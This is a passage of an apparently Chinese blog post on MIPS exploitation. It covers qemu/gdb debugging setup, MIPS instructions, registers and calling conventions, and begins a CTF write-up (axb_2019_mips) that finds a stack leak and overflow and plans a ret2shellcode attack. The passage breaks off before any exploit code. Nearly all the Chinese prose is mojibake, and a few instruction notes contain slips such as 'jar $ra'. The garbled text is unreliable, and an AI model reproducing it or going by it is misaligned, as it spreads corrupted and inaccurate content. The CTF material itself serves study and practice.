<li>å¦‚æœè¿è¡ŒåŠ¨æ€é“¾æ¥çš„ç¨‹åºï¼Œå¯èƒ½ä¼šé‡è§ä¸€äº›æŠ¥é”™ï¼Œ è¿™é‡Œçš„ <a href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99">è§£å†³æ–¹æ³•</a> æˆ–è®¸ä¼šå¯¹ä½ æœ‰æ‰€å¸®åŠ©</li>
<li>ä½¿ç”¨ <code>readelf -h xxx</code> å¯ä»¥æŸ¥çœ‹ç¨‹åºçš„å­—èŠ‚åº</li>
</ol>
<h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>è°ƒè¯•åˆ†ä¸º <strong>ç›´æ¥è°ƒè¯•ç¨‹åº</strong>  å’Œ <strong>åŠ è½½è¿›ç¨‹è°ƒè¯•</strong></p>
<h5 id="ç›´æ¥è°ƒè¯•ç¨‹åº"><a href="#ç›´æ¥è°ƒè¯•ç¨‹åº" class="headerlink" title="ç›´æ¥è°ƒè¯•ç¨‹åº"></a>ç›´æ¥è°ƒè¯•ç¨‹åº</h5><p>å‡è®¾è¦è°ƒè¯•çš„ç¨‹åºå«åš <code>demo</code> ï¼ˆå¤§ç«¯åºï¼‰ï¼Œé‚£ä¹ˆåœ¨ç»ˆç«¯æ‰§è¡Œ <code>qemu-mips -g 1234 ./demo</code></p>
<p>ç„¶åå†å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ˆ<code>set endian big</code> è¿™é‡Œæ˜¯è®¾ç½®ä¸ºå¤§ç«¯åºï¼Œå¦‚æœæ˜¯å°ç«¯åºçš„è¯è®¾ç½®ä¸º <code>little</code> ï¼Œå¦‚æœæƒ³åŠ è½½ç¨‹åºç¬¦å·è¡¨çš„è¯ï¼Œå†æ·»åŠ ä¸€ä¸ª <code>symbol-file ./demo</code>ï¼‰ </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set architecture mips</span><br><span class="line">set endian big</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>å®é™…è°ƒè¯•æƒ…å†µå¦‚ä¸‹å›¾ï¼Œå¦‚æ­¤å°±å¯ä»¥è¿›å…¥åˆ° <code>gdb</code> çš„è°ƒè¯•ç•Œé¢äº†</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112120319.png" alt="image-20230511212044987"></p>
<p>å¦‚æœæ„Ÿè§‰æ¯æ¬¡éƒ½è¦æ•²è¿™å‡ æ¡å‘½ä»¤æœ‰ç‚¹éº»çƒ¦çš„è¯ï¼Œå¯ä»¥ç¼–å†™ä¸€ä¸ª <code>shell</code> è„šæœ¬æ¥ç®€åŒ–å·¥ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå«åš <code>loader.sh</code> è„šæœ¬ï¼Œç¼–å†™å†…å®¹å¦‚ä¸‹ï¼ˆçº¯å±ä¸¾ä¾‹ï¼Œå…·ä½“æƒ…å†µå…·ä½“å¤„ç†ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./pwn2</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬åªéœ€è¦æ‰§è¡Œ <code>gdb-multiarch</code> åï¼Œæ‰§è¡Œä¸€æ¬¡ <code>source loader.sh </code> å‘½ä»¤å³å¯ã€‚</p>
<h5 id="åŠ è½½è¿›ç¨‹è°ƒè¯•"><a href="#åŠ è½½è¿›ç¨‹è°ƒè¯•" class="headerlink" title="åŠ è½½è¿›ç¨‹è°ƒè¯•"></a>åŠ è½½è¿›ç¨‹è°ƒè¯•</h5><p>è¿™ä¸ªé€šå¸¸ç”¨äºæˆ‘ä»¬ç¼–å†™æ”»å‡»è„šæœ¬åï¼Œéœ€è¦è¿›è¡Œè°ƒè¯•åˆ¤æ–­æ•°æ®æ˜¯å¦æ˜¯é¢„æœŸçš„é‚£æ ·ã€‚</p>
<p>åªéœ€è¦åœ¨ <code>EXP</code> ä¸­ç¼–å†™ä»£ç  <code>p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./demo&quot;])</code> å³å¯ï¼Œè¿™å…¶å®ä¼ å…¥è¿›å»çš„å°±æ˜¯ä¸€ä¸ªå‘½ä»¤åŒ…æ‹¬å‚æ•°åˆ—è¡¨ã€‚æ­£å¸¸è¿è¡Œç¨‹åºä¹Ÿæ˜¯åŒç† <code>p=process([&quot;qemu-mips&quot;,&quot;./demo&quot;])</code></p>
<p>å‰©ä¸‹çš„ä¾æ—§æ˜¯æ–°å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œ <code>gdb-multiarch</code> å‘½ä»¤ç­‰ç­‰ï¼ˆåŒä¸Šï¼‰</p>
<h3 id="æ±‡ç¼–æŒ‡ä»¤"><a href="#æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–æŒ‡ä»¤"></a>æ±‡ç¼–æŒ‡ä»¤</h3><p><code>li</code> (Load Immediate)æŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ªç«‹å³æ•°å­˜å…¥ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨,	<code>li   $gp, 0x498300</code> å°† <code>$gp</code> å¯„å­˜å™¨çš„å€¼èµ‹å€¼ä¸º <code>0x498300</code></p>
<p><code>lui</code> æŒ‡ä»¤å°†ä¸€ä¸ª <code>16</code> ä½çš„ç«‹å³æ•°å·¦ç§» <code>16</code> ä½åå­˜å…¥ç›®æ ‡å¯„å­˜å™¨ä¸­ï¼Œ <code>lui   $v0, 0x46</code> æ˜¯å°† <code>0x46</code> ç«‹å³æ•°å·¦ç§»  <code>16</code> ä½åå­˜å…¥ <code>$v0</code> å¯„å­˜å™¨ï¼Œå³ <code>$v0</code> å¯„å­˜å™¨çš„å€¼ä¸º <code>0x460000</code></p>
<p><code>ori</code> æŒ‡ä»¤æ˜¯ <code>MIPS</code> æ±‡ç¼–ä¸­çš„ä¸€ç§é€»è¾‘è¿ç®—æŒ‡ä»¤ï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ªå¯„å­˜å™¨çš„ä½ 16 ä½ä¸ä¸€ä¸ª 16 ä½çš„ç«‹å³æ•°æŒ‰ä½æˆ–è¿ç®—ï¼Œå¹¶å°†ç»“æœå­˜å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨ä¸­ã€‚<code>ori $t6,$t6,0x430a</code> æŒ‡ä»¤å°† <code>t6</code> å¯„å­˜å™¨ä¸ <code>0x430a</code> ç«‹å³æ•°è¿›è¡Œæˆ–è¿ç®—ï¼Œå°†ç»“æœæ”¾å› <code>$t6</code></p>
<p><code>la</code> (Load Address) æŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ªåœ°å€æˆ–æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ï¼Œ<code>la $v0, puts</code> æŒ‡ä»¤å°† <code>puts</code> å‡½æ•°åœ°å€å­˜å…¥ <code>$v0</code> å¯„å­˜å™¨ä¸­</p>
<p><code>lw</code> (Load Word) æŒ‡ä»¤ç”¨äº<strong>ä»ä¸€ä¸ªæŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ª <code>word</code> ç±»å‹çš„å€¼</strong>åˆ°ä¸€ä¸ªå¯„å­˜å™¨     <code>lw $v0, 0x14($fp)</code> å°† <code>$fp+0x14</code> çš„ä½ç½®ä¸­çš„æ•°æ®å­˜å…¥åˆ° <code>v0</code> ä¸­</p>
<p><code>sw</code> (Store Word) å°†æºå¯„å­˜å™¨ä¸­çš„å€¼å­˜å…¥æŒ‡å®šåœ°å€ï¼Œ<code>sw   $ra, 0x24($sp) </code> å°† <code>$ra</code> çš„å€¼å†™å…¥è·ç¦»æ ˆé¡¶ï¼ˆ<code>$sp</code>ï¼‰åç§» <code>0x24</code> çš„å†…å­˜å•å…ƒä¸­</p>
<p><code>move</code> æŒ‡ä»¤ç”¨äºå¯„å­˜å™¨ä¹‹é—´å€¼çš„ä¼ é€’ï¼Œ<code>move   $t5,$t1</code> å°† <code>$t1</code> èµ‹å€¼ç»™ <code>$5</code> </p>
<p><code>addi</code> æŒ‡ä»¤ç”¨äºè®¡ç®—ä¸€ä¸ªå¯„å­˜å™¨åŠ ä¸Šä¸€ä¸ªç«‹å³æ•°ï¼Œ<code>addi $t0,$t1,5</code> å°† <code>$t1</code> åŠ ä¸Š <code>5</code> ä¹‹åå°†ç»“æœæ”¾ä¸º <code>$t0</code></p>
<p><code>addu</code> æŒ‡ä»¤ç”¨äºè®¡ç®—æ— ç¬¦å·æ•°ä¹‹é—´è¿›è¡Œçš„åŠ æ³•æ“ä½œï¼Œ<code>addu $t0,$t1,$t2</code> å°† <code>$t1</code> å’Œ <code>$t2</code> è¿›è¡Œæ— ç¬¦å·ç›¸åŠ ï¼Œç»“æœå­˜å‚¨åœ¨ <code>$t0</code></p>
<p><code>add</code> æŒ‡ä»¤å’Œ <code>addu</code> ä¸€æ ·ï¼Œåªä¸è¿‡è¿›è¡Œçš„æ˜¯æœ‰ç¬¦å·æ•°ä¹‹é—´çš„åŠ æ³•ã€‚</p>
<p><code>addiu</code> æŒ‡ä»¤å°†ä¸Šé¢çš„ <code>addi</code> å’Œ <code>addu</code> ç»“åˆäº†ä¸€ä¸‹ï¼Œ<code> addiu  $a1, $zero, 2</code> è¿›è¡Œçš„æ˜¯å°†å¯„å­˜å™¨<code>$zero</code> åŠ ä¸Šä¸€ä¸ªç«‹å³æ— ç¬¦å·æ•° <code>2</code> ï¼Œå¹¶å°†ç»“æœå­˜å›å¯„å­˜å™¨ <code>$a1</code> ä¸­</p>
<p><code>jr</code> æ˜¯è·³è½¬æŒ‡ä»¤ï¼Œ<code>jar $ra</code> è·³è½¬åˆ° <code>$ra</code> å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€å¤„</p>
<p><code>jal</code> æŒ‡ä»¤æ˜¯è·³è½¬æŒ‡ä»¤ï¼Œ<code>jal target</code> å¤åˆ¶å½“å‰çš„ <code>PC</code> å€¼åˆ° <code>$ra</code> å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬åˆ° <code>target</code> å¤„</p>
<p><code>bnez</code> æŒ‡ä»¤ç”¨äºåœ¨å¯„å­˜å™¨çš„å€¼ä¸ä¸ºé›¶æ—¶è¿›è¡Œåˆ†æ”¯è·³è½¬ï¼Œ<code>bnez   $v0, loc_4005E8</code> è¡¨ç¤ºå½“ <code>$v0</code> ä¸ä¸ºé›¶æ—¶è·³è½¬åˆ° <code>0x4005E8</code> </p>
<p><code>b</code> æ˜¯æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œ<code>b loc_400604</code>  ç›´æ¥è·³è½¬åˆ° <code>0x400604</code> åœ°å€å¤„</p>
<h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><h4 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h4><p>åœ¨ <code>MIPS</code> ä½“ç³»ç»“æ„ä¸­æœ‰ <code>32</code> ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œåœ¨æ±‡ç¼–ç¨‹åºä¸­å¯ä»¥ç”¨ç¼–å· <code>$0-$31</code>è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨å¯„å­˜å™¨çš„åå­—è¡¨ç¤º</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305111218207.png" alt="image-20230511121821077" style="zoom:50%;" />



<h4 id="ç‰¹æ®Šå¯„å­˜å™¨"><a href="#ç‰¹æ®Šå¯„å­˜å™¨" class="headerlink" title="ç‰¹æ®Šå¯„å­˜å™¨"></a>ç‰¹æ®Šå¯„å­˜å™¨</h4><p><code>MIPS</code> æ¶æ„ä¸­å®šä¹‰äº† <code>3</code> ä¸ªç‰¹æ®Šçš„å¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯ <code>PC</code>ï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰ã€<code>HI</code> (ä¹˜é™¤ç»“æœé«˜ä½å¯„å­˜å™¨)ã€<code>LO</code>ï¼ˆä¹˜é™¤ç»“æœä½ä½å¯„å­˜å™¨ï¼‰ã€‚åœ¨è¿›è¡Œä¹˜æ³•è¿ç®—æ—¶ï¼Œ <code>HI</code> å’Œ <code>LO</code> ä¿å­˜ä¹˜æ³•çš„è¿ç®—ç»“æœï¼Œå…¶ä¸­ <code>HI</code> å­˜å‚¨é«˜ <code>32</code> ä½ï¼Œ<code>LO</code> å­˜å‚¨ä½ <code>32</code> ä½ï¼›åœ¨è¿›è¡Œé™¤æ³•è¿ç®—æ—¶ï¼Œ <code>HI</code> ä¿å­˜ä½™æ•°ï¼Œ <code>LO</code> å­˜å‚¨å•†ã€‚</p>
<h3 id="MIPS32-æ¶æ„çŸ¥è¯†"><a href="#MIPS32-æ¶æ„çŸ¥è¯†" class="headerlink" title="MIPS32 æ¶æ„çŸ¥è¯†"></a><code>MIPS32</code> æ¶æ„çŸ¥è¯†</h3><ul>
<li><p><code>MIPS</code> å›ºå®š <code>4</code> å­—èŠ‚æŒ‡ä»¤é•¿åº¦ </p>
</li>
<li><p>æ ˆæ˜¯ä»å†…å­˜çš„é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘å¢é•¿çš„</p>
</li>
<li><p>å¶å­å‡½æ•°ï¼šå‡½æ•°å†…éƒ¨æ²¡æœ‰å†è°ƒç”¨å…¶ä»–å‡½æ•°</p>
</li>
<li><p>éå¶å­å‡½æ•°ï¼šå‡½æ•°å†…éƒ¨è°ƒç”¨å…¶ä»–å‡½æ•°çš„å‡½æ•°</p>
</li>
<li><p>æµæ°´çº¿æ•ˆåº”ï¼šåœ¨åˆ†æ <code>MIPS</code> æ±‡ç¼–ä»£ç æ—¶ä¼šå‘ç°ï¼Œå…¶è·³è½¬åˆ°å‡½æ•°æˆ–è€…åˆ†æ”¯è·³è½¬è¯­å¥çš„ä¸‹ä¸€æ¡éƒ½æ˜¯ <code>nop</code> ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè¿™æ˜¯å› ä¸º <code>MIPS</code> é‡‡ç”¨äº†é«˜åº¦çš„æµæ°´çº¿ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯è·³è½¬æŒ‡ä»¤å¯¼è‡´çš„<strong>åˆ†æ”¯å»¶è¿Ÿæ•ˆåº”</strong>ã€‚åœ¨åˆ†æ”¯è·³è½¬è¯­å¥åé¢é‚£æ¡è¯­å¥å«åš<strong>åˆ†æ”¯å»¶è¿Ÿæ§½</strong>ï¼Œå½“è·³è½¬è¯­å¥åˆšæ‰§è¡Œçš„ä¸€ç¬é—´ï¼Œè·³è½¬åˆ°çš„åœ°å€åˆšå¡«å……å¥½ï¼ˆå¡«å……åˆ°ç¨‹åºè®¡æ•°å™¨ï¼‰ï¼Œ<strong>è¿˜æ²¡æœ‰æ‰§è¡Œç¨‹åºè®¡æ•°å™¨ä¸­å­˜æ”¾çš„æŒ‡ä»¤ï¼Œåˆ†æ”¯å»¶è¿Ÿæ§½çš„æŒ‡ä»¤å·²ç»è¢«æ‰§è¡Œäº†ï¼Œè¿™å°±æ˜¯æµæ°´çº¿æ•ˆåº”</strong>ï¼ˆå‡ æ¡æŒ‡ä»¤è¢«åŒæ—¶æ‰§è¡Œï¼Œåªæ˜¯å¤„äºä¸åŒçš„é˜¶æ®µï¼Œ <strong><code>MIPS</code> ä¸åƒå…¶ä»–æ¶æ„é‚£æ ·å­˜åœ¨æµæ°´çº¿é˜»å¡</strong>ï¼‰ï¼Œä¸ºäº†é¿å…å‡ºç°é—®é¢˜ï¼Œå› æ­¤åœ¨åˆ†æ”¯è·³è½¬è¯­å¥çš„ä¸‹ä¸€æ¡æŒ‡ä»¤é€šå¸¸æ˜¯ <code>nop</code> æŒ‡ä»¤æˆ–è€…å…¶ä»–æœ‰ç”¨çš„æŒ‡ä»¤ã€‚</p>
</li>
<li><p>ç¼“å­˜åˆ·æ–°æœºåˆ¶ï¼š<code>MIPS CPUs</code>æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„ <code>cache</code> : <code>æŒ‡ä»¤cache</code> å’Œ <code>æ•°æ®cache</code> ã€‚ æŒ‡ä»¤å’Œæ•°æ®åˆ†åˆ«åœ¨ä¸¤ä¸ªä¸åŒçš„ç¼“å­˜ä¸­ã€‚å½“ç¼“å­˜æ»¡äº†ï¼Œä¼šè§¦å‘ <code>flush</code> , å°†æ•°æ®å†™å›åˆ°ä¸»å†…å­˜ã€‚æ”»å‡»è€…çš„æ”»å‡»<code>payload</code> é€šå¸¸ä¼šè¢«åº”ç”¨å½“åšæ•°æ®æ¥å¤„ç†ï¼Œå­˜å‚¨åœ¨æ•°æ®ç¼“å­˜ä¸­ã€‚å½“ <code>payload</code> è§¦å‘æ¼æ´ï¼Œ åŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹çš„æ—¶å€™ï¼Œä¼šå»æ‰§è¡Œå†…å­˜ä¸­çš„ <code>shellcode</code> .å¦‚æœæ•°æ®ç¼“å­˜æ²¡æœ‰è§¦å‘ <code>flush</code> çš„è¯ï¼Œ<code>shellcode</code> ä¾ç„¶å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œè€Œæ²¡æœ‰å†™å…¥ä¸»å†…å­˜ã€‚è¿™ä¼šå¯¼è‡´ç¨‹åºæ‰§è¡Œäº†æœ¬è¯¥å­˜å‚¨ <code>shellcode</code> çš„åœ°å€å¤„éšæœºçš„ä»£ç ï¼Œå¯¼è‡´ä¸å¯é¢„çŸ¥çš„åæœã€‚(é€šå¸¸æ‰§è¡Œ <code>sleep(1)</code> åˆ·æ–°)</p>
</li>
</ul>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305102022075.png" alt="image-20230510202231987"></p>
<h3 id="å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="å‡½æ•°è°ƒç”¨çº¦å®š"></a>å‡½æ•°è°ƒç”¨çº¦å®š</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305110732606.png" alt="image-20230511073238845" style="zoom:50%;" />



<p>å‡½æ•°è°ƒç”¨æ—¶ä¼ å‚ï¼šå¦‚æœå‡½æ•°çš„å‚æ•°å°äºç­‰äºå››ä¸ªï¼Œé‚£ä¹ˆä¼šä½¿ç”¨ <code>$a0 ~ $a3</code> å¯„å­˜å™¨æ¥å­˜æ”¾å‚æ•°ã€‚å¦‚æœå‚æ•°å¤šäºå››ä¸ªï¼Œé‚£ä¹ˆå¤šäºçš„å‚æ•°åˆ™å­˜æ”¾åˆ°æ ˆé‡Œï¼ˆåŒæ—¶ä¹Ÿä¼šé¢„ç•™å‡ºå‰å››ä¸ªå‚æ•°çš„å†…å­˜ç©ºé—´ï¼Œå› ä¸ºè¢«è°ƒç”¨è€…ä½¿ç”¨å‰å››ä¸ªå‚æ•°æ—¶ï¼Œä¼šç»Ÿä¸€å°†å‚æ•°æ”¾åˆ°ä¿ç•™çš„æ ˆç©ºé—´ï¼‰ï¼Œå…·ä½“æƒ…å†µæ˜¯å‡½æ•° <code>A</code> è°ƒç”¨å‡½æ•° <code>B</code> ï¼Œè°ƒç”¨è€…å‡½æ•°ï¼ˆå‡½æ•°<code>A</code> ï¼‰ä¼šåœ¨è‡ªå·±çš„æ ˆé¡¶é¢„ç•™ä¸€éƒ¨åˆ†ç©ºé—´æ¥ä¿å­˜è¢«è°ƒç”¨è€…ï¼ˆå‡½æ•° <code>B</code> ï¼‰çš„å‚æ•°ï¼Œç§°ä¹‹ä¸ºè°ƒç”¨å‚æ•°ç©ºé—´ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092258483.png" alt="image-20230509225831965" style="zoom:50%;" />



<p>å‡½æ•° <code>A</code> è°ƒç”¨å‡½æ•° <code>B</code>ã€‚å¦‚æœ <code>B</code> æ˜¯å¶å­å‡½æ•°ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨ <code>B</code> å‡½æ•°æ—¶ï¼Œä¼šå°† <code>B</code> å‡½æ•°çš„è¿”å›åœ°å€å­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ï¼›å¦‚æœ <code>B</code> æ˜¯éå¶å­å‡½æ•°ï¼ˆ<code>B</code> å‡½æ•°å†…éƒ¨è°ƒç”¨äº†ä¸€ä¸ª <code>C</code> å‡½æ•°ï¼‰ï¼Œé‚£ä¹ˆåœ¨è·³è½¬åˆ° <code>B</code> å‡½æ•°æ—¶ï¼Œä¼šå°†å…¶è¿”å›åœ°å€å…ˆå­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ä¸­ï¼Œéšååœ¨ <code>B</code> å‡½æ•°å†…éƒ¨å†å°† <code>$ra</code> å¯„å­˜å™¨çš„å€¼å­˜å…¥æ ˆä¸­ï¼ˆä½äº <code>fp-0x4</code> çš„ä½ç½®ï¼Œå¦‚ä¸‹å›¾ï¼‰ã€‚å½“ <code>B</code> å‡½æ•°è°ƒç”¨ <code>C</code> å‡½æ•°æ—¶ï¼Œä¼šå°†å…¶è¿”å›åœ°å€å­˜å…¥ <code>$ra</code> å¯„å­˜å™¨ï¼Œåœ¨è¿”å›æ—¶æ‰§è¡Œ <code>jr $ra</code> æŒ‡ä»¤å›åˆ° <code>B</code> å‡½æ•°ã€‚ç°åœ¨å‡è®¾ <code>B</code> å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•å‡†å¤‡è¿”å›åˆ° <code>A</code> å‡½æ•°ï¼Œä¼šå°†åŸå…ˆå­˜å…¥æ ˆé‡Œçš„è¿”å›åœ°å€è¯»åˆ° <code>$ra</code> å¯„å­˜å™¨ä¸­ï¼Œæœ€åæ‰§è¡Œ <code>jr $ra</code> æŒ‡ä»¤ï¼Œå›åˆ° <code>A</code> å‡½æ•°</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092257102.png" alt="image-20230509225747069" style="zoom:50%;" />



<h3 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h3><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><h5 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112102666.png" alt="image-20230511210201613"></p>
<p>å‘ç°ä¿æŠ¤å…¨å…³ï¼Œå¹¶ä¸”æ˜¯å°ç«¯åº</p>
<h5 id="è§£å†³æŠ¥é”™"><a href="#è§£å†³æŠ¥é”™" class="headerlink" title="è§£å†³æŠ¥é”™"></a>è§£å†³æŠ¥é”™</h5><p>å°è¯•ç”¨ <code>qemu-mipsel ./pwn2</code> è¿è¡Œæ—¶å‘ç°å¦‚ä¸‹æŠ¥é”™</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel: Could not open &#x27;/lib/ld-uClibc.so.0&#x27;: No such file or directory</span><br></pre></td></tr></table></figure>

<p>è¿™è¡¨æ˜åœ¨ <code>/lib</code> ç›®å½•ä¸‹ç¼ºå°‘ <code>ld-uClibc.so.0</code> æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>file pwn2</code> æ¥æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112045280.png" alt="image-20230511204507118"></p>
<p>å‘ç°åŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„æ˜¯ <code>/lib/ld-uClibc.so.0</code> ï¼Œè€Œåœ¨è¿™ä¸ªä½ç½®æ²¡æœ‰æ‰¾åˆ° <code>ld-uClibc.so.0</code> ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>sudo find / -name &quot;ld-uClibc.so.0&quot; 2&gt;/dev/null</code> å‘½ä»¤æœç´¢ä¸€ä¸‹ï¼Œå‘ç°æ˜¯æœ‰è¿™ä¸ª  <code>ld-uClibc.so.0</code> æ–‡ä»¶çš„ï¼Œåªä¸è¿‡ä¸åœ¨ <code>/lib</code> ç›®å½•ä¸‹ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112049318.png" alt="image-20230511204913250"></p>
<p>å› æ­¤åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥è¿‡å»å³å¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/ld-uClibc.so.0 /lib/</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å°è¯•å†æ¬¡è¿è¡Œ <code>pwn2</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel ./pwn2                                   </span><br><span class="line">./pwn2: can&#x27;t load library &#x27;libc.so.0&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™è¡¨æ˜ç°åœ¨è¿˜ç¼ºå°‘ä¸€ä¸ª <code>libc.so.0</code> çš„åº“ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>ls /home/zikh/Desktop/mipsel-linux-uclibc/lib/</code> å‘½ä»¤ï¼Œå‘ç°æ˜¯æœ‰ <code>libc.so.0</code> è¿™ä¸ªåº“çš„ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112028607.png" alt="image-20230511202846472"></p>
<p>å› æ­¤æˆ‘ä»¬ä¾ç„¶ç»™è½¯é“¾æ¥åˆ° <code>/lib</code> ç›®å½•ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/libc.so.0 /lib/ </span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ç¨‹åºå¯ä»¥è¿è¡ŒæˆåŠŸï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112030731.png" alt="image-20230511203036662" style="zoom:50%;" />

<h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112143512.png" alt="image-20230511214356466" style="zoom:50%;" />

<p>é¦–å…ˆè¿™é‡Œæœ‰ä¸€ä¸ª <code>read</code> è¾“å…¥ï¼Œéšå <code>printf</code> å‡½æ•°æ˜¯ä½¿ç”¨äº† <code>%s</code> å°†æ•°æ®è¿›è¡Œæ‰“å°ï¼Œåœ¨è¿™é‡Œæ€€ç–‘å¯èƒ½æœ‰æœºä¼šæ³„éœ²ä¸€äº›æ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112146239.png" alt="image-20230511214644840"></p>
<p>å‘ç°å†™å…¥ <code>0x14</code> å­—èŠ‚çš„æ•°æ®ï¼Œç¡®å®å¯ä»¥é¡ºå¸¦æ‰“å°å‡ºæ¥ä¸€ä¸ªæ ˆåœ°å€</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112147526.png" alt="image-20230511214754487"></p>
<p>éšåå‘ç° <code>vuln</code> å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼ˆå¦‚ä¸Šï¼‰</p>
<h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>å› ä¸ºæœ‰äº†æ ˆåœ°å€ï¼Œå¹¶ä¸”æ ˆåŒºæ˜¯æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œæ‰€ä»¥æ‰“ä¸€ä¸ªå¸¸è§„çš„ <code>ret2shellcode</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120729296.png" alt="image-20230512072926146"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå‘ç°æœ¬åœ°æ˜¯é€šäº†çš„ï¼Œå› æ­¤æ€è·¯æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œ<code>EXP</code> å¦‚ä¸‹</p>
